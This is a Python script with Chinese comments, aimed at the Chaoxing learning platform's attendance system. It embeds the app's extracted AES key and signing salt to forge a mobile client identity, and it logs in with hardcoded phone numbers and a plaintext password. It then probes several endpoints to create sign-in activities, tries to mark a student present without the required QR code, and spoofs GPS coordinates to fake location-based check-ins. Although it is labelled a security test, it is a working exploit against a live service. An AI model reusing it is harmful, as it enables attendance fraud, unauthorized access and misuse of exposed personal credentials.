#!/usr/bin/env python3
"""
创建进行中的签到活动 - 尝试多种方法
然后测试学生能否直接签到
"""
import base64, hashlib, json, uuid, requests, urllib3, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"}

s_s, puid_s = login("18436633997", "3.1415926Cpy")
s_t, puid_t = login("19712720708", "3.1415926Cpy")
print(f"学生puid={puid_s}, 教师puid={puid_t}")

# ======================================================================
# 尝试创建签到活动 - 多种方法
# ======================================================================
print("\n" + "=" * 80)
print("尝试创建签到活动")
print("=" * 80)

new_aid = None

# 方法1: 使用web UA + 教师session
print("\n--- 方法1: Web UA ---")
s_t_web = requests.Session()
s_t_web.verify = False
s_t_web.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.9",
})
for c in s_t.cookies:
    s_t_web.cookies.set(c.name, c.value, domain=c.domain, path=c.path)

r = s_t_web.post(f"{BASE}/ppt/activeAPI/createActive",
                 data={"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "安全测试签到"},
                 headers={"Referer": f"{BASE}/", "X-Requested-With": "XMLHttpRequest",
                          "Content-Type": "application/x-www-form-urlencoded"},
                 timeout=20)
print(f"  Web UA: HTTP {r.status_code}, {r.text[:200]}")
d = safe_json(r)
if isinstance(d, dict) and d.get("result") and len(str(d.get("result", ""))) > 5:
    new_aid = str(d["result"])
    print(f"  创建成功! aid={new_aid}")

# 方法2: 使用mooc1-api域名
if not new_aid:
    print("\n--- 方法2: mooc1-api域名 ---")
    r = s_t.post("https://mooc1-api.chaoxing.com/mooc-ans/ppt/activeAPI/createActive",
                 data={"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "安全测试"},
                 headers=ajax_hdr, timeout=20)
    print(f"  mooc1-api: HTTP {r.status_code}, {r.text[:200]}")
    d = safe_json(r)
    if isinstance(d, dict) and d.get("result") and len(str(d.get("result", ""))) > 5:
        new_aid = str(d["result"])
        print(f"  创建成功! aid={new_aid}")

# 方法3: 先获取cpi，再创建
if not new_aid:
    print("\n--- 方法3: 带cpi参数 ---")
    r = s_t.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    d = safe_json(r)
    teacher_cpi = ""
    if isinstance(d, dict) and "channelList" in d:
        for ch in d["channelList"]:
            c = ch.get("content", {})
            if str(c.get("id", "")) == CLASS_ID:
                teacher_cpi = str(c.get("cpi", ""))
                break
    print(f"  教师cpi={teacher_cpi}")

    if teacher_cpi:
        r = s_t.post(f"{BASE}/ppt/activeAPI/createActive",
                     data={"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2",
                           "title": "安全测试", "cpi": teacher_cpi},
                     headers=ajax_hdr, timeout=20)
        print(f"  带cpi: HTTP {r.status_code}, {r.text[:200]}")
        d = safe_json(r)
        if isinstance(d, dict) and d.get("result") and len(str(d.get("result", ""))) > 5:
            new_aid = str(d["result"])
            print(f"  创建成功! aid={new_aid}")

# 方法4: 使用不同的参数名
if not new_aid:
    print("\n--- 方法4: 不同参数名 ---")
    param_variations = [
        {"courseId": COURSE_ID, "clazzId": CLASS_ID, "activeType": "2", "title": "测试"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "name": "测试"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "type": "2", "title": "测试"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "测试", "uid": puid_t},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "测试",
         "uid": puid_t, "cpi": teacher_cpi if teacher_cpi else ""},
    ]
    for i, params in enumerate(param_variations):
        r = s_t.post(f"{BASE}/ppt/activeAPI/createActive", data=params, headers=ajax_hdr, timeout=20)
        resp = r.text[:150]
        d = safe_json(r)
        if isinstance(d, dict) and d.get("result") and len(str(d.get("result", ""))) > 5:
            new_aid = str(d["result"])
            print(f"  参数变体{i+1}成功! aid={new_aid}")
            break
        else:
            print(f"  参数变体{i+1}: HTTP {r.status_code}, {resp}")

# 方法5: 直接使用newsign路径
if not new_aid:
    print("\n--- 方法5: /newsign/路径 ---")
    r = s_t.post(f"{BASE}/newsign/createActive",
                 data={"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2",
                       "title": "测试", "uid": puid_t},
                 headers=ajax_hdr, timeout=20)
    print(f"  /newsign/createActive: HTTP {r.status_code}, {r.text[:200]}")

# ======================================================================
# 如果创建成功，测试学生签到
# ======================================================================
if new_aid:
    print(f"\n{'=' * 80}")
    print(f"签到活动创建成功! aid={new_aid}")
    print(f"{'=' * 80}")

    # 查询活动状态
    r = s_s.get(f"{BASE}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    if isinstance(d, dict) and "activeList" in d:
        for item in d["activeList"]:
            if str(item.get("id", "")) == new_aid:
                print(f"  活动信息: type={item.get('activeType')}, status={item.get('status')}, name={item.get('nameOne')}")
                break

    # 学生签到前状态
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": new_aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    before = get_status(d)
    print(f"  签到前: status={before}, data={json.dumps(d.get('data', {}), ensure_ascii=False)[:200]}")

    # 测试1: stuSignajax直接签到
    print("\n  --- 测试1: stuSignajax直接签到 ---")
    r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                 data={"activeId": new_aid, "uid": puid_s, "clientip": "",
                       "latitude": "-1", "longitude": "-1", "appType": "15", "fid": "0"},
                 headers=ajax_hdr, timeout=20)
    print(f"  stuSignajax: {r.text[:200]}")

    time.sleep(2)
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": new_aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    after1 = get_status(d)
    print(f"  签到后: status={after1}")

    if after1 == 1:
        print("  *** 学生直接签到成功！无需二维码！***")
    else:
        # 测试2: 带位置信息
        print("\n  --- 测试2: stuSignajax带位置 ---")
        r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                     data={"activeId": new_aid, "uid": puid_s, "clientip": "",
                           "latitude": "39.908823", "longitude": "116.397470",
                           "appType": "15", "fid": "0", "address": "北京市"},
                     headers=ajax_hdr, timeout=20)
        print(f"  stuSignajax(位置): {r.text[:200]}")

        time.sleep(2)
        r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": new_aid, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        after2 = get_status(d)
        print(f"  签到后: status={after2}")

        if after2 == 1:
            print("  *** 学生带位置签到成功！***")
        else:
            # 测试3: newsign/updateSignStatus
            print("\n  --- 测试3: newsign/updateSignStatus ---")
            r = s_s.post(f"{BASE}/newsign/updateSignStatus",
                         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": new_aid},
                         data={"uids": puid_s, "status": "1", "remark": "",
                               "activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
                         headers=ajax_hdr, timeout=20)
            print(f"  newsign/updateSignStatus: {r.text[:200]}")

            time.sleep(2)
            r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": new_aid, "uid": puid_s}, timeout=20)
            d = safe_json(r)
            after3 = get_status(d)
            print(f"  签到后: status={after3}")

    # 结束活动
    r = s_t.post(f"{BASE}/ppt/activeAPI/endSign",
                 data={"activeId": new_aid, "courseId": COURSE_ID, "classId": CLASS_ID},
                 headers=ajax_hdr, timeout=20)
    print(f"\n  结束活动: {r.text[:100]}")

else:
    print("\n无法创建签到活动。教师账号可能没有创建权限（roletype=3）")
    print("尝试用现有活动测试...")

    # 找一个学生未签到的签到活动
    r = s_s.get(f"{BASE}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    unsigned_sign_aid = None
    if isinstance(d, dict) and "activeList" in d:
        for item in d["activeList"]:
            atype = str(item.get("activeType", ""))
            if atype == "2":  # 签到类型
                aid = str(item.get("id", ""))
                r2 = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
                d2 = safe_json(r2)
                st = get_status(d2)
                if st is None:
                    unsigned_sign_aid = aid
                    print(f"  找到未签到的签到活动: aid={aid}, name={item.get('nameOne')}")
                    break

    if unsigned_sign_aid:
        print(f"\n  测试未签到活动 aid={unsigned_sign_aid}...")

        # stuSignajax
        r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                     data={"activeId": unsigned_sign_aid, "uid": puid_s, "clientip": "",
                           "latitude": "-1", "longitude": "-1", "appType": "15", "fid": "0"},
                     headers=ajax_hdr, timeout=20)
        print(f"  stuSignajax: {r.text[:200]}")

        # 带位置
        r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                     data={"activeId": unsigned_sign_aid, "uid": puid_s, "clientip": "",
                           "latitude": "39.908823", "longitude": "116.397470",
                           "appType": "15", "fid": "0", "address": "北京市"},
                     headers=ajax_hdr, timeout=20)
        print(f"  stuSignajax(位置): {r.text[:200]}")

        time.sleep(2)
        r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": unsigned_sign_aid, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        final_status = get_status(d)
        print(f"  最终状态: status={final_status}")
    else:
        print("  所有签到活动都已签到，无法测试未签到场景")

# ======================================================================
# 额外测试: 位置签到伪造（找一个未签到的位置签到）
# ======================================================================
print("\n" + "=" * 80)
print("位置签到伪造测试 - 找未签到的位置签到")
print("=" * 80)

r = s_s.get(f"{BASE}/ppt/activeAPI/taskactivelist",
            params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
d = safe_json(r)
if isinstance(d, dict) and "activeList" in d:
    for item in d["activeList"]:
        name = str(item.get("nameOne", ""))
        if "位置" in name:
            aid = str(item.get("id", ""))
            r2 = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
            d2 = safe_json(r2)
            st = get_status(d2)
            print(f"  位置签到: aid={aid}, name={name}, status={st}")
            if st is None:
                # 未签到，测试伪造位置
                print(f"  尝试伪造位置签到...")
                r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                             data={"activeId": aid, "uid": puid_s, "clientip": "",
                                   "latitude": "39.908823", "longitude": "116.397470",
                                   "appType": "15", "fid": "0", "address": "北京市天安门广场"},
                             headers=ajax_hdr, timeout=20)
                print(f"  伪造位置签到: {r.text[:200]}")

                time.sleep(2)
                r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
                d = safe_json(r)
                new_st = get_status(d)
                if new_st == 1:
                    print(f"  *** 位置签到伪造成功！***")
                else:
                    print(f"  位置签到伪造失败, status={new_st}")
                break

print("\n测试完成")
